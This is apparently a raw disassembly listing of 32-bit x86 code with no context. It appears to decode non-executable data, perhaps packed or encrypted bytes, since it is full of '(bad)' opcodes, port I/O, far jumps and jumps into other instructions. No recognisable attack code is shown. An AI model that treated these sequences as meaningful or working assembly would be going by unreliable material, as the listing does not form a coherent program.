  441df1:	pop    ebp
  441df2:	add    dl,bh
  441df4:	jl     0x441e66
  441df6:	mov    eax,ds:0x147f4537
  441dfb:	(bad)  
  441dfc:	mov    bl,cl
  441dfe:	in     al,0x0
  441e00:	ss test eax,0x5e02111
  441e06:	repnz clc 
  441e08:	xlat   BYTE PTR ds:[ebx]
  441e09:	ss pop edx
  441e0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441e0c:	xchg   edx,eax
  441e0d:	int    0x80
  441e0f:	adc    DWORD PTR [ebx],0x3
  441e12:	pop    ss
  441e13:	fild   WORD PTR es:[edx]
  441e16:	cld    
  441e17:	loop   0x441e2b
  441e19:	push   0xb06e196d
  441e1e:	jle    0x441e19
  441e20:	lods   eax,DWORD PTR ds:[esi]
  441e21:	pop    ebp
  441e22:	es push edx
  441e24:	dec    ebp
  441e25:	push   eax
  441e26:	dec    edx
  441e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441e28:	nop
  441e29:	pop    eax
  441e2a:	mov    ?,WORD PTR [edx-0x549dfeff]
  441e30:	or     BYTE PTR [eax-0x337dc7eb],dh
  441e36:	xchg   ecx,eax
  441e37:	scas   eax,DWORD PTR es:[edi]
  441e38:	das    
  441e39:	inc    edi
  441e3a:	inc    ebp
  441e3b:	xor    DWORD PTR [eax-0x19d58c03],ecx
  441e41:	aad    0xdc
  441e43:	aad    0xae
  441e45:	push   0xffffffe8
  441e47:	push   ebp
  441e48:	jecxz  0x441e7e
  441e4a:	push   ebp
  441e4b:	retf   0x4788
  441e4e:	xchg   edi,eax
  441e4f:	and    eax,0xe8affdc6
  441e54:	imul   eax,DWORD PTR [ebx],0x7fd5eb16
  441e5a:	in     eax,0xd4
  441e5c:	xor    ch,BYTE PTR [ebp-0x5852e8a0]
  441e62:	add    al,0x17
  441e64:	mov    al,ds:0x73d6e2fd
  441e69:	addr16 jns 0x441ed7
  441e6c:	add    eax,DWORD PTR [eax-0x74]
  441e6f:	adc    eax,0x4760bc5d
  441e74:	test   eax,0x8a71a009
  441e79:	inc    esp
  441e7a:	inc    eax
  441e7b:	in     al,0x7c
  441e7d:	add    eax,DWORD PTR [ebx+eiz*8]
  441e80:	or     ecx,DWORD PTR [ebx+0x27]
  441e83:	outs   dx,DWORD PTR ds:[esi]
  441e84:	sbb    ecx,DWORD PTR gs:[ecx+eax*8-0x68]
  441e89:	sti    
  441e8a:	pop    ds
  441e8b:	imul   ebp,DWORD PTR [ecx+0x16059be0],0x40980a02
  441e95:	mov    BYTE PTR [edx],bl
  441e97:	sar    DWORD PTR [ecx+eax*1+0x1f],cl
  441e9b:	adc    ecx,edi
  441e9d:	pusha  
  441e9e:	out    dx,eax
  441e9f:	pop    edi
  441ea0:	fcmovb st,st(4)
  441ea2:	repz loopne 0x441ef6
  441ea5:	add    ah,BYTE PTR [edx]
  441ea7:	inc    eax
  441ea8:	mov    eax,0x7eafbf89
  441ead:	mul    BYTE PTR [eax-0x79]
  441eb0:	out    0x61,al
  441eb2:	in     al,0x36
  441eb4:	cmp    BYTE PTR [edi],0x0
  441eb7:	push   ss
  441eb8:	push   0xcbaaccda
  441ebd:	inc    ecx
  441ebe:	(bad)  
  441ebf:	(bad)  [ebp+0x42]
  441ec2:	push   ss
  441ec3:	xchg   esi,eax
  441ec4:	fistp  WORD PTR fs:[edi]
  441ec7:	jns    0x441ebd
  441ec9:	je     0x441eb6
  441ecb:	icebp  
  441ecc:	mov    ecx,0xc4c4a995
  441ed1:	add    eax,0x1eda55ba
  441ed6:	repnz xchg edi,eax
  441ed8:	imul   ebp,edi,0x24a5d9a
  441ede:	lods   eax,DWORD PTR ds:[esi]
  441edf:	cli    
  441ee0:	lea    edx,[edx+0xfb45116]
  441ee6:	scas   eax,DWORD PTR es:[edi]
  441ee7:	aam    0xe3
  441ee9:	fdiv   st(4),st
  441eeb:	out    dx,eax
  441eec:	xchg   edx,eax
  441eed:	mov    ebx,0xb7b503b1
  441ef2:	cdq    
  441ef3:	int3   
  441ef4:	mov    BYTE PTR [edi-0x29c2d1be],bh
  441efa:	pop    edi
  441efb:	shr    DWORD PTR [edi+0x2],0xfe
  441eff:	pushf  
  441f00:	aad    0xf0
  441f02:	into   
  441f03:	hlt    
  441f04:	push   ss
  441f05:	xchg   DWORD PTR [edi],ebx
  441f07:	std    
  441f08:	sbb    al,0x1e
  441f0a:	bound  edx,QWORD PTR [eax+edi*2+0xd]
  441f0e:	rcl    ch,cl
  441f10:	jns    0x441ee2
  441f12:	push   edx
  441f13:	scas   eax,DWORD PTR es:[edi]
  441f14:	adc    BYTE PTR [edi-0x5e],ch
  441f17:	mov    cl,BYTE PTR [eax+0x6e3bde91]
  441f1d:	jne    0x441eda
  441f1f:	retf   
  441f20:	mov    ebp,0xaaa3342d
  441f25:	and    DWORD PTR [esi-0x39507518],0xadd5b13e
  441f2f:	lock or BYTE PTR [ecx+0x268cd710],cl
  441f36:	or     ebx,DWORD PTR [edx-0x43]
  441f39:	lds    ebx,FWORD PTR [esp+edx*2+0x5e25358b]
  441f40:	add    bl,bh
  441f42:	mov    ds:0x5e7d6ba5,al
  441f47:	sbb    edi,DWORD PTR [ebx+0x3]
  441f4a:	xchg   edx,eax
  441f4b:	jne    0x441f29
  441f4d:	fistp  WORD PTR [eax+0x47]
  441f50:	pop    ecx
  441f51:	sub    dl,BYTE PTR [ebx+0x62014dc7]
  441f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441f58:	and    al,0x23
  441f5a:	mov    al,0x54
  441f5c:	mov    esp,DWORD PTR [esi+0x700830d4]
  441f62:	into   
  441f63:	and    al,0x65
  441f65:	and    ebx,DWORD PTR ds:0x26ed81ec
  441f6b:	mov    esp,0xd09f7b1b
  441f70:	push   0xed66c00
  441f75:	pop    ss
  441f76:	std    
  441f77:	push   ss
  441f78:	or     cl,BYTE PTR [esi]
  441f7a:	(bad)  
  441f7b:	hlt    
  441f7c:	xchg   edx,eax
  441f7d:	sub    edi,esi
  441f7f:	scas   eax,DWORD PTR es:[edi]
  441f80:	inc    ebp
  441f81:	add    dl,dh
  441f83:	aad    0x8f
  441f85:	lds    eax,FWORD PTR [edx+0x5bd206c]
  441f8b:	aam    0x7d
  441f8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441f8e:	add    edx,ebp
  441f90:	cld    
  441f91:	push   cs
  441f92:	mov    ebp,0x1551b51d
  441f97:	mov    ch,0x9
  441f99:	inc    ecx
  441f9a:	push   ecx
  441f9b:	imul   ecx,esi,0x20
  441f9e:	paddq  mm5,mm5
  441fa1:	test   eax,0xae7a483
  441fa6:	sbb    BYTE PTR [eax-0x5da1a07a],dl
  441fac:	in     al,0xe5
  441fae:	inc    eax
  441faf:	pop    esp
  441fb0:	sub    al,0x2a
  441fb2:	jmp    0x6bb3:0x8ebc75d5
  441fb9:	cmp    ebx,DWORD PTR [esp+edi*4-0x8]
  441fbd:	std    
  441fbe:	cmp    eax,0x4f018c55
  441fc3:	sbb    ecx,0x6e15a2ee
  441fc9:	xchg   edi,eax
  441fca:	scas   eax,DWORD PTR es:[edi]
  441fcb:	aad    0xff
  441fcd:	sbb    esp,DWORD PTR [esi-0x31b6a83f]
  441fd3:	lods   eax,DWORD PTR ds:[esi]
  441fd4:	xchg   esp,eax
  441fd5:	inc    edi
  441fd6:	sbb    DWORD PTR ds:0x321413,esi
  441fdc:	mov    ebp,ebx
  441fde:	mov    cs,WORD PTR [eax+edx*1]
  441fe1:	adc    al,0xde
  441fe3:	ins    BYTE PTR es:[edi],dx
  441fe4:	lods   eax,DWORD PTR ds:[esi]
  441fe5:	xchg   bl,cl
  441fe7:	cmp    DWORD PTR [eax+0x2ef3a123],ecx
  441fed:	fsub   DWORD PTR [eax-0x59]
  441ff0:	inc    esi
  441ff1:	sub    bl,BYTE PTR ss:[ecx-0x7ad19bd0]
  441ff8:	dec    edx
  441ff9:	xor    eax,0x8658d41d
  441ffe:	jp     0x441fdf
  442000:	cli    
  442001:	xchg   ecx,eax
  442002:	pusha  
  442003:	push   ebp
  442004:	sbb    BYTE PTR [edi+0x5db6cc70],ah
  44200a:	push   edi
  44200b:	aam    0xf4
  44200d:	dec    ecx
  44200e:	sbb    al,0xb1
  442010:	xchg   dh,bh
  442012:	loope  0x44206e
  442014:	pop    eax
  442015:	rcl    DWORD PTR [ebx-0x18fed14b],0xe0
  44201c:	pop    ebx
  44201d:	jecxz  0x441fa8
  44201f:	sbb    dl,BYTE PTR [eax]
  442021:	(bad)
  442024:	pop    esi
  442025:	je     0x441ff3
  442027:	jo     0x441feb
  442029:	les    ebx,FWORD PTR [edi]
  44202b:	mov    edi,0x85b73e50
  442030:	cli    
  442031:	cdq    
  442032:	cmp    edi,edx
  442034:	cmp    dh,cl
  442036:	addr16 xchg esi,eax
  442038:	push   0x66
  44203a:	sti    
  44203b:	aam    0xbb
  44203d:	mov    ds:0xf45a1b8d,al
  442042:	in     eax,dx
  442043:	mov    BYTE PTR [ecx+0x6e4cc5],cl
  442049:	fld    QWORD PTR [esi+0x24]
  44204c:	inc    ebx
  44204d:	imul   esi,DWORD PTR [edi+edx*8+0x1e],0x3
  442052:	es push eax
  442054:	lods   eax,DWORD PTR ds:[esi]
  442055:	daa    
  442056:	sbb    ebp,eax
  442058:	mov    eax,0x929d60d6
  44205d:	aam    0xc2
  44205f:	add    DWORD PTR [eax-0x7],esp
  442062:	jbe    0x442038
  442064:	and    ecx,edx
  442066:	test   eax,0x6a8ddbc6
  44206b:	inc    eax
  44206c:	mov    DWORD PTR [ebp+0x6cecb41a],edx
  442072:	imul   ecx,DWORD PTR [edi-0x39],0x5
  442076:	(bad)  
  442077:	into   
  442078:	jl     0x4420c0
  44207a:	mov    dl,0x3c
  44207c:	sub    dh,BYTE PTR [esi+0x1e]
  44207f:	jns    0x442038
  442081:	mov    ebp,ebx
  442083:	push   ebx
  442084:	fidivr DWORD PTR [ebx-0x58042bfa]
  44208a:	stos   DWORD PTR es:[di],eax
  44208c:	cmc    
  44208d:	repnz test DWORD PTR [esi+0x6eed2589],esp
  442094:	pop    esp
  442095:	xchg   ebx,eax
  442096:	ret    
  442097:	pop    edi
  442098:	dec    ebp
  442099:	add    ebp,DWORD PTR [eax+0x3d]
  44209c:	mov    esp,0x972e18e9
  4420a1:	xchg   ecx,eax
  4420a2:	pop    ds
  4420a3:	das    
  4420a4:	add    eax,0x54e07e31
  4420a9:	sbb    al,0x6f
  4420ab:	aam    0xb9
  4420ad:	mov    ebx,0x56ada059
  4420b2:	push   0x4a
  4420b4:	mov    BYTE PTR [edi-0x7a],bl
  4420b7:	add    esi,DWORD PTR [ecx+eax*8-0x44]
  4420bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4420bc:	dec    edi
  4420bd:	(bad)  
  4420be:	sbb    esp,DWORD PTR [edx]
  4420c0:	les    esp,FWORD PTR [esi]
  4420c2:	inc    ebp
  4420c3:	sahf   
  4420c4:	jno    0x4420c9
  4420c6:	aaa    
  4420c7:	push   eax
  4420c8:	add    esp,esi
  4420ca:	add    eax,0x9f4b8652
  4420cf:	jl     0x44205b
  4420d1:	cwde   
  4420d2:	loopne 0x442145
  4420d4:	push   0xffffffab
  4420d6:	mov    esp,edx
  4420d8:	sbb    DWORD PTR [eax],edx
  4420da:	ins    BYTE PTR es:[edi],dx
  4420db:	fidiv  WORD PTR [ebx-0x765c3929]
  4420e1:	popa   
  4420e2:	xchg   edx,eax
  4420e3:	jns    0x44209a
  4420e5:	add    DWORD PTR [ebx+0x49],ebp
  4420e8:	xchg   edi,eax
  4420e9:	inc    edi
  4420ea:	xchg   esp,eax
  4420eb:	dec    esi
  4420ec:	jmp    0xbfc07d76
  4420f1:	jle    0x442132
  4420f3:	xchg   edx,eax
  4420f4:	mov    ah,0x3b
  4420f6:	dec    ebx
  4420f7:	push   0x75
  4420f9:	add    cl,BYTE PTR [esi+edi*2]
  4420fc:	or     BYTE PTR [ecx-0x1],ch
  4420ff:	fsubr  QWORD PTR ds:[esi]
  442102:	sub    al,0x24
  442104:	nop
  442105:	es xor bh,dl
  442108:	mov    eax,0xe670393
  44210d:	pop    ecx
  44210e:	push   esp
  44210f:	pop    edi
  442110:	scas   al,BYTE PTR es:[edi]
  442111:	mov    DWORD PTR [esp+esi*8-0x5519cb90],esp
  442118:	xchg   esp,eax
  44211a:	dec    eax
  44211b:	icebp  
  44211c:	inc    ebp
  44211d:	arpl   WORD PTR ds:0x609025e7,dx
  442123:	adc    edi,DWORD PTR [ebp+edx*2-0x64]
  442127:	dec    edi
  442128:	outs   dx,DWORD PTR ds:[esi]
  442129:	call   0x970e:0x263b495
  442130:	cmp    al,BYTE PTR [edi+eiz*8]
  442133:	clc    
  442134:	out    0xe4,eax
  442136:	jl     0x44213d
  442138:	xchg   esp,eax
  442139:	xchg   ebx,eax
  44213a:	lahf   
  44213b:	push   esp
  44213c:	or     eax,0x437fe1c5
  442141:	add    eax,edx
  442143:	shr    DWORD PTR [edi],0xd
  442146:	xchg   DWORD PTR [ebx+0x751fc053],esp
  44214c:	adc    ecx,esp
  44214e:	jecxz  0x4420fd
  442150:	dec    esi
  442151:	imul   ebp,edi,0xffffffb3
  442154:	jb     0x44214a
  442156:	paddq  mm0,QWORD PTR [esi+0x6ad29e4a]
  44215d:	pusha  
  44215e:	push   ds
  44215f:	pop    ecx
  442160:	xor    BYTE PTR [ebp+0x49],dh
  442163:	daa    
  442164:	scas   eax,DWORD PTR es:[edi]
  442165:	mov    ?,WORD PTR [ebp+0x3d]
  442168:	std    
  442169:	cmp    BYTE PTR [edi],bl
  44216b:	popf   
  44216c:	mov    dh,0xcc
  44216e:	adc    al,0x94
  442170:	inc    edi
  442171:	pusha  
  442172:	ins    DWORD PTR es:[edi],dx
  442173:	fnsave [ebx+0x9]
  442176:	nop    DWORD PTR [ecx+0x58]
  44217a:	mov    DWORD PTR [ebp-0x2c],0xd6c17002
  442181:	mov    DWORD PTR [edx+0x48],0xff2898c0
  442188:	pop    eax
  442189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44218a:	pop    ds
  44218b:	mov    ch,0x17
  44218d:	inc    edx
  44218e:	push   esi
  44218f:	psrlq  mm4,QWORD PTR [edx+0x7a]
  442193:	(bad)  [esi]
  442195:	sub    al,0x18
  442197:	into   
  442198:	aam    0xbb
  44219a:	pusha  
  44219b:	fcomp  QWORD PTR [ebx-0x71a261a9]
  4421a1:	mov    cl,0xd6
  4421a3:	jl     0x44215a
  4421a5:	cmc    
  4421a6:	and    BYTE PTR [esp+esi*1+0x75d4639d],ah
  4421ad:	xchg   ebp,eax
  4421ae:	cmp    edx,DWORD PTR [ebp+0x7]
  4421b1:	inc    edi
  4421b2:	lahf   
  4421b3:	shr    BYTE PTR [ebp-0x765258db],0x79
  4421ba:	cli    
  4421bb:	pushf  
  4421bc:	mov    dl,0x52
  4421be:	and    dl,BYTE PTR [ebp-0x2dfdf63e]
  4421c4:	fsub   st(0),st
  4421c6:	retf   0x6a81
  4421c9:	sub    eax,DWORD PTR [edi+edx*1]
  4421cc:	and    BYTE PTR [ecx+0x1e],0x67
  4421d0:	sahf   
  4421d1:	sti    
  4421d2:	and    BYTE PTR [esi-0x28eb1d3a],al
  4421d8:	sbb    eax,0xa40da910
  4421dd:	test   bl,cl
  4421df:	sbb    BYTE PTR [ecx+0x71901b79],cl
  4421e5:	fprem  
  4421e7:	and    dh,dl
  4421e9:	add    bh,BYTE PTR [edi+edx*4]
  4421ec:	jmp    0xadc7163e
  4421f1:	sbb    DWORD PTR [edi+edi*1-0x6b],0xecdced01
  4421f9:	push   ds
  4421fa:	cmp    DWORD PTR ds:[ebp+ebx*4+0x7e],edi
  4421ff:	aam    0x3e
  442201:	mov    eax,ds:0xcd324f46
  442206:	or     DWORD PTR [edi-0x5cbe5877],0xffffffb7
  44220d:	mov    cl,0x37
  44220f:	icebp  
  442210:	lods   eax,DWORD PTR ds:[esi]
  442211:	add    dh,dl
  442213:	cdq    
  442214:	scas   ax,WORD PTR es:[edi]
  442216:	inc    esi
  442217:	cmp    bl,BYTE PTR [esp+ebx*1+0x1a]
  44221b:	pop    esi
  44221c:	clc    
  44221d:	add    ecx,DWORD PTR [ebp+0x2602091c]
  442223:	push   eax
  442224:	(bad)  
  442225:	sbb    BYTE PTR [esi],bl
  442227:	adc    BYTE PTR [eax],ch
  442229:	daa    
  44222a:	fidivr DWORD PTR [edi+0x60]
  44222d:	xor    eax,0x85ff3ba6
  442232:	test   al,0x7f
  442234:	pop    edx
  442235:	mov    dl,0x77
  442237:	inc    ebx
  442238:	clc    
  442239:	mov    al,ds:0x2938808
  44223e:	inc    esi
  44223f:	add    esi,esp
  442241:	jmp    0xff2e:0x4ba88127
  442248:	mov    BYTE PTR [ebx],ch
  44224a:	cld    
  44224b:	push   ebp
  44224c:	test   DWORD PTR [ebx+esi*8-0x15],edi
  442250:	xchg   esp,eax
  442251:	push   ds
  442252:	int3   
  442253:	sub    BYTE PTR [edx],bl
  442255:	loope  0x442254
  442257:	mov    eax,0x1c56a10a
  44225c:	cmp    ah,BYTE PTR [edi-0x53c3629f]
  442262:	outs   dx,DWORD PTR ds:[esi]
  442263:	fild   QWORD PTR [ecx]
  442265:	mov    ?,eax
  442267:	fdivrp st(7),st
  442269:	add    ch,BYTE PTR [ecx+eiz*8+0x61]
  44226d:	xchg   ebx,esp
  44226f:	jnp    0x442247
  442271:	push   eax
  442272:	cli    
  442273:	ins    DWORD PTR es:[edi],dx
  442274:	js     0x44222d
  442276:	pop    ds
  442277:	outs   dx,DWORD PTR ds:[esi]
  442278:	nop
  442279:	mov    gs,eax
  44227b:	or     eax,0x31e3281
  442280:	fild   QWORD PTR [edx-0x14]
  442283:	push   edi
  442284:	imul   edx,DWORD PTR [edx+0x592dadb],0xa1ec820a
  44228e:	add    DWORD PTR [edx],eax
  442290:	std    
  442291:	jge    0x442295
  442293:	pop    edi
  442294:	mov    BYTE PTR ds:0x8650857a,ch
  44229a:	shr    BYTE PTR [ecx+0x58b5f947],0xe5
  4422a1:	loop   0x4422c2
  4422a3:	push   eax
  4422a4:	jo     0x44229c
  4422a6:	(bad)  
  4422a7:	push   esi
  4422a8:	push   esi
  4422a9:	jmp    0x44230b
  4422ab:	pop    ds
  4422ac:	es xor eax,0x45a2cba0
  4422b2:	ja     0x442289
  4422b4:	xor    DWORD PTR [edi+eiz*2+0x705d2161],edx
  4422bb:	in     al,0x8e
  4422bd:	xchg   ebx,eax
  4422be:	mov    al,0xcd
  4422c0:	and    cl,BYTE PTR [ebx+0x27]
  4422c3:	and    al,0x7e
  4422c5:	or     al,0x40
  4422c7:	aad    0xbe
  4422c9:	or     bl,BYTE PTR [ebx+ebp*8+0x30]
  4422cd:	and    ch,BYTE PTR [ebp+0x8]
  4422d0:	jno    0x442279
  4422d2:	outs   dx,BYTE PTR ds:[esi]
  4422d3:	add    DWORD PTR [ebp+edi*2-0x49],esi
  4422d7:	repnz or eax,eax
  4422da:	(bad)  
  4422db:	mov    WORD PTR [ebp-0x7d2a61b3],fs
  4422e1:	sbb    ah,0x3c
  4422e4:	dec    edi
  4422e5:	and    ebp,edx
  4422e7:	addr16 mov bh,0x67
  4422ea:	cli    
  4422eb:	xor    BYTE PTR [ecx],cl
  4422ed:	ja     0x4422ef
  4422ef:	sbb    DWORD PTR [edx-0x452b44a8],esp
  4422f5:	dec    edi
  4422f6:	push   ds
  4422f7:	and    dl,ch
  4422f9:	sbb    al,0xb6
  4422fb:	cmp    ecx,DWORD PTR [eax-0x6d18b79d]
  442301:	jnp    0x442345
  442303:	xor    eax,ebx
  442305:	add    eax,0x88e420ec
  44230a:	out    0xf0,al
  44230c:	stc    
  44230d:	cmp    eax,0x2514ad64
  442312:	push   ebx
  442313:	and    edi,DWORD PTR [ebx-0x2686b11]
  442319:	loop   0x44231b
  44231b:	icebp  
  44231c:	mov    dh,0x1
  44231e:	jo     0x4422c9
  442320:	(bad)  
  442321:	in     al,0x82
  442323:	sbb    cl,BYTE PTR [ecx+0x4]
  442326:	push   es
  442327:	(bad)  
  442328:	mov    BYTE PTR [edi-0x3e],ch
  44232b:	pop    esp
  44232c:	mov    ch,0x5b
  44232e:	push   edx
  44232f:	cmp    esi,eax
  442331:	jmp    0x375d:0xa0f6d472
  442338:	jo     0x4422f3
  44233a:	jne    0x44235f
  44233c:	mov    edi,edi
  44233e:	(bad)  
  44233f:	scas   ax,WORD PTR es:[edi]
  442341:	outs   dx,DWORD PTR ds:[esi]
  442342:	nop
  442343:	das    
  442344:	add    al,BYTE PTR [ebx]
  442346:	jbe    0x442394
  442348:	mov    ecx,DWORD PTR [ecx+0x12]
  44234b:	pop    esp
  44234c:	adc    ebp,DWORD PTR [edx]
  44234e:	fnstcw WORD PTR fs:[eax]
  442351:	xchg   edi,eax
  442352:	div    edx
  442354:	push   cs
  442355:	repz cmp al,BYTE PTR [ecx]
  442358:	lea    eax,ds:0x2bc7a5d4
  44235e:	sub    al,0x24
  442360:	aad    0x8f
  442362:	pop    ds
  442363:	xlat   BYTE PTR ds:[ebx]
  442364:	pushf  
  442365:	(bad)  
  442366:	es jmp 0xc23c03a3
  44236c:	cmp    cl,BYTE PTR [ecx+0x5c8822ad]
  442372:	sahf   
  442373:	mov    dh,0xf9
  442375:	cmp    DWORD PTR [ebx-0x7ab27666],ecx
  44237b:	xchg   BYTE PTR [edx-0x57],bl
  44237e:	inc    ebx
  44237f:	pop    edx
  442380:	popa   
  442381:	inc    esp
  442382:	loop   0x442398
  442384:	add    eax,0xc555702
  442389:	xchg   esp,eax
  44238a:	or     ah,BYTE PTR [eax]
  44238c:	mov    DWORD PTR [ebx+0x66],edx
  44238f:	(bad)  
  442390:	les    edi,FWORD PTR [eax]
  442392:	xor    DWORD PTR [esi+0x4752022d],edi
  442398:	jae    0x442358
  44239a:	mov    esp,0x1fb7a4e0
  44239f:	(bad)  
  4423a1:	sbb    ch,BYTE PTR [edi-0x7bcd785]
  4423a7:	loope  0x442348
  4423a9:	add    eax,0x84562964
  4423ae:	enter  0x81e7,0xbd
  4423b2:	cwd    
  4423b4:	fnsave [edx+0x5c]
  4423b7:	pop    ds
  4423b8:	adc    DWORD PTR [edx+0x51],esi
  4423bb:	mov    al,ds:0xd700d9a2
  4423c0:	aad    0xad
  4423c2:	and    bl,BYTE PTR [eax]
  4423c4:	dec    ebx
  4423c5:	pop    ebp
  4423c6:	fs dec esi
  4423c8:	mov    ch,cl
  4423ca:	addr16 loope 0x44243a
  4423cd:	mov    dl,0x81
  4423cf:	xchg   edi,eax
  4423d0:	mov    ebp,0x19c8b98f
  4423d5:	cmp    BYTE PTR [ebx-0x41],al
  4423d8:	and    BYTE PTR [edx],al
  4423da:	sbb    al,0x82
  4423dc:	pop    ds
  4423dd:	adc    ecx,DWORD PTR [edi+0x7fa18ec4]
  4423e3:	pop    ecx
  4423e4:	and    al,0xb9
  4423e6:	xchg   esp,eax
  4423e7:	fld    TBYTE PTR [ecx]
  4423e9:	cdq    
  4423ea:	mov    gs:0x443c05b3,eax
  4423f0:	leave  
  4423f1:	xor    eax,0x5d72494d
  4423f6:	jl     0x442445
  4423f8:	out    dx,eax
  4423f9:	pop    es
  4423fa:	fcmovnu st,st(5)
  4423fc:	mov    BYTE PTR [ecx-0x31],ah
  4423ff:	and    DWORD PTR [ebp+0x27],esi
  442402:	ret    
  442403:	pop    edx
  442404:	mov    al,0xb2
  442406:	pop    esi
  442407:	cmp    BYTE PTR [esi],0x83
  44240a:	mov    ss,edi
  44240c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44240d:	lods   al,BYTE PTR ds:[esi]
  44240e:	or     bl,BYTE PTR [ecx+edi*8]
  442411:	pop    ss
  442412:	popf   
  442413:	aam    0x1c
  442415:	mov    WORD PTR [eax],ds
  442417:	mov    cl,0x56
  442419:	bound  ecx,QWORD PTR [ebx+0x5a11a375]
  44241f:	push   0xffffffa6
  442421:	inc    edi
  442422:	dec    esp
  442423:	aam    0xc
  442425:	test   DWORD PTR [eax-0x7a],edi
  442428:	pop    eax
  442429:	in     eax,0x6a
  44242b:	imul   ebp,DWORD PTR [edx+edi*2+0x4f08e382],0x5e976ee
  442436:	mov    al,ds:0x6d314fc2
  44243b:	ss stc 
  44243d:	pushf  
  44243e:	pop    ds
  44243f:	int    0x67
  442441:	icebp  
  442442:	xor    al,0xb6
  442444:	lock pop edi
  442446:	cmp    eax,0x533e48d4
  44244b:	call   0x697a2bfc
  442450:	mov    DWORD PTR [edi+0x746d82ea],esi
  442456:	inc    DWORD PTR [ebx+ecx*4-0x42c06df0]
  44245d:	mov    esp,0xeb57901f
  442462:	cmc    
  442463:	(bad)  [ecx-0x22f583af]
  442469:	add    al,0x48
  44246b:	push   edi
  44246c:	sbb    cl,BYTE PTR [ecx+eiz*4]
  44246f:	(bad)  
  442470:	es mov bh,0xa6
  442473:	mov    DWORD PTR [ebx-0x560b0ed8],edi
  442479:	repnz xlat BYTE PTR ds:[ebx]
  44247b:	aaa    
  44247c:	and    eax,0x22d63802
  442481:	imul   edi,DWORD PTR [ebx+0x5466e9b1],0x9002df58
  44248b:	sahf   
  44248c:	add    bh,BYTE PTR [edx+0x2f89c209]
  442492:	enter  0x4c8,0xa1
  442496:	dec    edi
  442497:	pop    edi
  442498:	xor    al,BYTE PTR [edx]
  44249a:	push   ss
  44249b:	retf   
  44249c:	fninit 
  44249e:	sar    ebx,1
  4424a0:	in     al,dx
  4424a1:	inc    ecx
  4424a2:	pop    ds
  4424a3:	shr    DWORD PTR [esi],cl
  4424a5:	xchg   esi,eax
  4424a6:	or     eax,0xd9507015
  4424ab:	aam    0x3
  4424ad:	jle    0x4424fa
  4424af:	(bad)  
  4424b0:	adc    al,0x46
  4424b2:	popa   
  4424b3:	sub    BYTE PTR [edx+0x7bc9391d],bl
  4424b9:	add    edi,DWORD PTR [esi+eax*1-0x2b373db6]
  4424c0:	fst    DWORD PTR [edi+ebp*4]
  4424c3:	cmp    eax,0x4fffcfd3
  4424c8:	xchg   ecx,eax
  4424ca:	loope  0x44248a
  4424cc:	ja     0x44252a
  4424ce:	lea    ecx,[ebx-0xb]
  4424d1:	lds    esi,FWORD PTR [ebx+eiz*2-0x2ab63f08]
  4424d8:	lods   al,BYTE PTR ds:[esi]
  4424d9:	(bad)  
  4424db:	or     eax,0xfeadc23f
  4424e0:	mov    BYTE PTR [ebp+0x78],ch
  4424e3:	rcr    edi,1
  4424e5:	mov    esi,0x249a7d33
  4424ea:	adc    bl,0x6
  4424ed:	xchg   ecx,eax
  4424ee:	mov    al,ds:0x7574db15
  4424f3:	mov    bl,0x89
  4424f5:	loope  0x4424cd
  4424f7:	sbb    al,BYTE PTR [edi-0x1ebf0e9]
  4424fd:	add    al,BYTE PTR [eax-0x42bd6883]
  442503:	dec    DWORD PTR [edi-0x62]
  442506:	pop    ds
  442507:	lahf   
  442508:	dec    ebx
  442509:	adc    BYTE PTR [edx+0x2730b47c],0xd4
  442510:	xor    eax,DWORD PTR [edx+eiz*1-0x64]
  442514:	fdivp  st(1),st
  442516:	enter  0x89a3,0xc7
  44251a:	adc    eax,0xe012abfa
  44251f:	mov    esp,0xc0be0229
  442524:	xchg   edx,eax
  442525:	imul   ebp,DWORD PTR [edi+0x6c58c173],0x7e5dec7b
  44252f:	fdiv   st,st(5)
  442531:	add    BYTE PTR [ebp+0x7f95e4c],cl
  442537:	xchg   ebx,eax
  442538:	rol    DWORD PTR ds:0x73d435e,1
  44253e:	jcxz   0x442588
  442541:	daa    
  442542:	pop    ds
  442543:	popa   
  442544:	jle    0x4424f7
  442546:	call   0x17d4:0x93367631
  44254d:	es (bad) 
  44254f:	ret    0x59a8
  442552:	ins    DWORD PTR es:[edi],dx
  442553:	fmul   DWORD PTR [eax+0x3e503977]
  442559:	adc    eax,0x14d235b6
  44255e:	je     0x442520
  442560:	jmp    0xc83b3247
  442565:	outs   dx,DWORD PTR ds:[esi]
  442566:	xchg   ebp,eax
  442567:	jmp    0x4424f2
  442569:	mov    ds:0x36156f1b,eax
  44256e:	data16 sbb al,0x5e
  442571:	add    ebp,DWORD PTR [esi-0x29]
  442574:	xor    bh,bl
  442576:	ins    DWORD PTR es:[edi],dx
  442577:	jge    0x442502
  442579:	cs push es
  44257b:	rol    BYTE PTR [edi-0x4e351c95],1
  442581:	xchg   esi,eax
  442582:	jg     0x442601
  442584:	scas   al,BYTE PTR es:[edi]
  442585:	ret    0xd4fd
  442588:	sub    DWORD PTR [edi-0x74],edi
  44258b:	pop    ebx
  44258c:	sbb    esi,ecx
  44258e:	jge    0x4425ad
  442590:	xchg   ebp,eax
  442591:	jae    0x442612
  442593:	jg     0x442570
  442595:	inc    edx
  442596:	sub    al,0xc4
  442598:	xlat   BYTE PTR ds:[ebx]
  442599:	cmp    bl,ah
  44259b:	fidivr WORD PTR [esi]
  44259d:	add    esi,DWORD PTR [esi]
  44259f:	(bad)  
  4425a0:	sbb    bh,al
  4425a2:	cs loope 0x44258d
  4425a5:	sbb    DWORD PTR [edi],0x13
  4425a8:	mov    esp,0x525099a7
  4425ad:	in     al,0xbc
  4425af:	aam    0x3d
  4425b1:	les    ebp,FWORD PTR gs:[ebx]
  4425b4:	xchg   esp,eax
  4425b5:	sbb    BYTE PTR [esi+ebp*2],cl
  4425b8:	xchg   BYTE PTR [ecx],ah
  4425ba:	lods   al,BYTE PTR ds:[esi]
  4425bb:	cld    
  4425bc:	leave  
  4425bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4425be:	push   DWORD PTR [eax+0x76]
  4425c1:	xor    BYTE PTR [ebx],dh
  4425c3:	(bad)  
  4425c4:	xchg   ecx,eax
